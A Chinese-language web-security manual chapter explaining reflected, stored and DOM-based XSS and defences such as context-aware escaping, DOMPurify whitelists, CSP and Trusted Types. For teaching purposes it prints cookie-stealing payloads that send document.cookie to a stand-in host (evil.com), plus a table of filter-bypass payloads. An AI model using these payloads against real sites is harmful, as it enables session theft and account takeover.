---
title: "XSS：三种形态与真实防御"
description: "反射型、存储型、DOM 型各自怎么发生，为什么「过滤尖括号」是错的防御思路，以及按输出上下文选择转义方式——附一个富文本场景的完整处理方案。"
source: "https://daiw.org/manual/web-security/xss"
---

# XSS：三种形态与真实防御

反射型、存储型、DOM 型各自怎么发生，为什么「过滤尖括号」是错的防御思路，以及按输出上下文选择转义方式——附一个富文本场景的完整处理方案。

XSS 的本质一句话说完：**你把不可信数据放进了 HTML，浏览器把它当成了代码。**

危害常被低估——「不就是弹个框吗」。实际上 XSS 意味着**攻击者的代码以你的用户的身份、在你的域下执行**：读取页面上的任何数据、以用户身份发起任意请求、伪造界面骗取密码。**它等价于用户账号被完全接管。**

## 三种形态

### 反射型：payload 在 URL 里

```
https://example.com/search?q=<script>fetch('//evil.com?c='+document.cookie)</script>
```

服务端把 `q` 的值直接拼进了搜索结果页：

```html
<p>没有找到关于 <script>fetch('//evil.com?c='+document.cookie)</script> 的结果</p>
```

**利用方式**：诱导受害者点这个链接（钓鱼邮件、社交平台）。因为链接是你的真实域名，可信度很高。

### 存储型：payload 存进了数据库

攻击者在评论区提交：

```html
<img src=x onerror="fetch('//evil.com?c='+document.cookie)">
```

服务端存下来，**之后每个看这条评论的人都会中招**。不需要诱导点击，危害是反射型的数量级倍数。管理后台如果也渲染这些内容，管理员会被优先命中。

### DOM 型：服务端完全无辜

```javascript
// 前端代码
const name = new URLSearchParams(location.search).get('name');
document.getElementById('greeting').innerHTML = '你好，' + name;
```

访问 `?name=<img src=x onerror=alert(1)>` 就触发了。

::: warning
**DOM 型 XSS 的 payload 可能永远不发给服务器。** 用 URL fragment：

  ```
  https://example.com/#<img src=x onerror=alert(1)>
  ```

`#` 后面的内容**浏览器不会发送给服务端**。这意味着：你的服务端日志里什么都没有，WAF 也看不到——**所有服务端侧的防御全部失效**。

DOM 型只能在前端防。
:::

## 为什么「过滤尖括号」是错的

新手最常见的做法是黑名单：

```javascript
// ❌ 这样写等于没写
const safe = input.replace(/<script>/gi, '');
```

绕过方式多到列不完：

| 绕过 | payload |
| --- | --- |
| 大小写 | `<ScRiPt>` |
| 嵌套（替换一次后重新拼出来） | `<scr<script>ipt>` |
| 换标签 | `<img src=x onerror=alert(1)>` |
| 换事件 | `<svg onload=alert(1)>`、`<body onpageshow=alert(1)>` |
| 不用尖括号 | 如果注入点在属性里：`" onmouseover="alert(1)` |
| 编码 | `&#60;script&#62;`、`%3Cscript%3E` |

**根本问题在于思路**：黑名单要穷举「所有危险的东西」，而 HTML + JS 的表达方式几乎无穷。**正确的思路是：按输出位置做恰当的编码，让数据永远只是数据。**

## 核心原则：转义取决于输出上下文

同一段数据，放在不同位置需要**完全不同**的处理：

| 输出位置 | 例子 | 需要的处理 |
| --- | --- | --- |
| HTML 文本 | `<p>这里</p>` | HTML 实体编码：`< > & " '` |
| HTML 属性 | `<div title="这里">` | HTML 实体编码，**且属性必须加引号** |
| JavaScript 字符串 | `<script>var x = "这里"</script>` | JS 字符串转义（`\x3c` 之类），**不是** HTML 编码 |
| URL 参数 | `<a href="/p?q=这里">` | `encodeURIComponent` |
| URL 整体 | `<a href="这里">` | **必须校验协议**，只允许 http/https |
| CSS | `<style>color: 这里</style>` | CSS 转义（尽量别这么干） |

::: warning
**最危险的是「URL 整体」那一行。** 只做 HTML 编码是不够的：

  ```html
  <a href="javascript:alert(document.cookie)">点我</a>
  ```

这里没有任何尖括号、没有引号逃逸，HTML 编码完全不起作用。**必须校验协议白名单**：

  ```javascript
  function safeUrl(u) {
    try {
      const parsed = new URL(u, location.origin);
      return ['http:', 'https:', 'mailto:'].includes(parsed.protocol) ? parsed.href : '#';
    } catch {
      return '#';
    }
  }
  ```

同类的还有 `data:text/html,...`、`vbscript:`。**白名单，不要黑名单。**
:::

## 现代框架：默认安全，但有逃生舱

React、Vue、Angular 默认都对插值做转义：

```jsx
// ✅ 安全 —— React 会转义
<p>{userInput}</p>
```

问题出在**你主动打开的那些口子**：

```jsx
// ❌ 这个 API 的名字已经在警告你了
<div dangerouslySetInnerHTML={{ __html: userInput }} />
```

```vue
<!-- ❌ Vue 的对应物 -->
<div v-html="userInput"></div>
```

```javascript
// ❌ 原生 DOM 的几个危险出口
el.innerHTML = userInput;
el.outerHTML = userInput;
document.write(userInput);
eval(userInput);
new Function(userInput);
setTimeout(userInput);          // 传字符串时等价于 eval
element.setAttribute('href', userInput);   // 协议未校验
```

**排查你的代码库**：

```bash
grep -rnE "dangerouslySetInnerHTML|v-html|\.innerHTML\s*=|document\.write|eval\(|new Function\(" src/ \
  --include="*.ts" --include="*.tsx" --include="*.js" --include="*.jsx" --include="*.vue"
```

每一处命中都要问：**这里的数据来源可信吗？** 不可信就必须先过消毒。

## 富文本：唯一必须解析 HTML 的场景

有时你确实需要允许用户提交 HTML（编辑器、评论富文本）。这时**不能转义**（转义了就没有格式了），只能**消毒**：

```javascript
import DOMPurify from 'dompurify';

const clean = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'u', 'a', 'ul', 'ol', 'li',
                 'blockquote', 'code', 'pre', 'h2', 'h3'],
  ALLOWED_ATTR: ['href', 'title'],
  ALLOWED_URI_REGEXP: /^(?:https?|mailto):/i,   // 协议白名单
  FORBID_TAGS: ['style', 'script', 'iframe', 'object', 'embed', 'form'],
  FORBID_ATTR: ['onerror', 'onload', 'onclick', 'style'],
});
```

三条实践要点：

1. **用成熟的库，绝不自己写。** HTML 解析的边界情况多到超乎想象（浏览器的容错解析、mXSS、命名空间混淆），自己写的消毒器一定有洞。
2. **白名单标签和属性**，不要黑名单。
3. **保持库更新**——[本站依赖审计那一章](/manual/computer-programming/web-security/dependency-audit)提到过，DOMPurify 本身也会出绕过漏洞，用旧版本等于没消毒。

::: info
**在哪一侧消毒？** 建议**存储时和渲染时都做**：

- 存储时消毒 → 数据库里干净，其它消费方（导出、邮件、App）也受益；
- 渲染时消毒 → 兜住「存储时用的旧版库有绕过」和「数据从别的途径进来」。

只做一侧都有明显缺口。存储时消毒的额外好处是：**将来发现某个消毒规则不对，你还有原始数据可以重新处理**——所以更稳妥的做法是**存原文 + 渲染时消毒**，或者两份都存。
:::

## 纵深防御：假设 XSS 一定会发生

**没有任何单一措施能保证消灭 XSS。** 所以要让「XSS 发生了」的后果尽量小：

| 措施 | 挡住什么 |
| --- | --- |
| **CSP** | 让注入的脚本无法执行、无法外传数据。[下一章专讲](/manual/computer-programming/web-security/csp) |
| **Cookie 加 `HttpOnly`** | JS 读不到会话 token，XSS 偷不走 Cookie |
| **Cookie 加 `SameSite`** | 限制跨站携带 |
| **敏感操作二次验证** | 改密码、转账要重新输密码——XSS 拿到会话也做不了最关键的事 |
| **`X-Content-Type-Options: nosniff`** | 防止浏览器把上传的文本文件当 HTML 执行 |
| **Trusted Types** | 从根上禁止字符串直接赋给 `innerHTML` 这类 sink |

Trusted Types 是较新但很有效的一招：

```
Content-Security-Policy: require-trusted-types-for 'script'
```

开启后，`el.innerHTML = someString` 会**直接抛异常**，除非那个字符串经过了你注册的策略函数。**它把「记得消毒」从人的纪律变成了浏览器强制的规则**。

## 自查清单

- [ ] 代码里所有 `innerHTML` / `dangerouslySetInnerHTML` / `v-html` 都已审查数据来源
- [ ] 所有拼接进 `href`/`src` 的 URL 都做了协议白名单校验
- [ ] 富文本走成熟消毒库 + 标签属性白名单，且库是最新版
- [ ] 会话 Cookie 有 `HttpOnly`
- [ ] 已配置 CSP（至少 report-only 模式在跑）
- [ ] JSON 接口返回 `Content-Type: application/json`（不是 `text/html`）

## 小结

- XSS 等价于**用户账号被接管**，不是「弹个框」。
- 三种形态里，**DOM 型可以完全绕过服务端**（fragment 不上传），只能前端防。
- **黑名单过滤必然被绕过**；正确做法是按**输出上下文**做恰当编码。
- URL 类输出必须**校验协议白名单**，HTML 编码对 `javascript:` 无效。
- 富文本用成熟库消毒 + 白名单，**存原文、渲染时消毒**更稳妥。
- 必须做纵深防御：**CSP + HttpOnly + 敏感操作二次验证**，假设 XSS 会发生。

下一章把纵深防御里最重要的那一层展开。👉 [CSP：从报告模式到严格模式](/manual/computer-programming/web-security/csp)
